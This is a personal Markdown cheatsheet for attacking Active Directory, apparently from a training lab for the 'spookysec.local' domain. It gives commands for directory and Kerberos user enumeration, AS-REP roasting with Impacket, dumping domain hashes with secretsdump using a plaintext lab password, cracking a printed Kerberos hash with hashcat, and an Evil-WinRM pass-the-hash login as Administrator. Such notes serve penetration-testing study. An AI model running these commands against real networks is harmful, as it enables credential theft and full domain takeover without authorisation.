# Vince's cheatsheet
## Helpful cheatsheets
* Kerberos - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
* SMB - https://github.com/irgoncalves/smbclient_cheatsheet
* Wordlists : https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content


## WFUZZ
WFUZZ directory enumeration
```bash
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://ip:port/FUZZ --sc 200
```
##Gobuster
```bash
gobuster dns -d TARGET -t 25 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

## enum4linux
Active Directory enumeration (DC Domain Controller)
```bash
enum4linux
```
## Kerbrute
Kerberos username enumeration
```bash
/opt/kerbrute userenum --dc dc.local -d dc.local userlist.txt
```
NB : Hostname must be added to the hosts file. Use nmap to find the Domain name.

## Impacket 
### GetNPUsers
With Impacket example GetNPUsers.py:
```bash
# Check ASREPRoast for a list of users (no credentials required)
impacket-GetNPUsers -usersfile valid_users.txt spookysec.local/
```
Hashcat Wiki page : https://hashcat.net/wiki/doku.php?id=example_hashes
NB : Valid users list generated with Kerbrute.

### Secretdump
Get hash credentials from dump with secretdump:
```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.10.242.155 -just-dc-ntlm
```
## Hashcat
Cracking with dictionary of passwords:
```bash
hashcat -m18200 '$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:bf4709a453ad7d40eb48c0c481badd6a$f14d24154b1962622216837b369ffbeb1536d815243f07df44667e24326b75fbad3a622a3acf8f54b4f3d9114169551dd42542218e3692368e849fb400aaec42aebfa12213d6f130325297f4ec2cd61312e6fe5ad28534cab6d78de488d2d42c7c456d46497fdd1d2f6bcd6961ce6b261ab6bb7366f364c7cbb4e18edafd4adf08ae2d1cd7acbdb5d141bc38620b678b038c70ea58bcd79596640abb6400eb17bfe491961de5fc929224b0cf4626d2158b0fbdbceef25235786f4f57ad1bc471a48eca2f9624fc5bab88afc4e6afd38afbb5d4b9936c03d7cd0fc2d2a63b57cfbbc951c33a9c4f4133f1a5cd49316700b87e' passwordlist.txt
```
# Crackstation
```bash
https://crackstation.net/
```

## Smbclient
List SMB/CIFS shares (authenticated):
```bash
smbclient -L 10.10.242.155 -U unsername@domain.local%password
```


## Evil-Winrm
Pass the hash attack with Evil-Winrm:
```bash
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
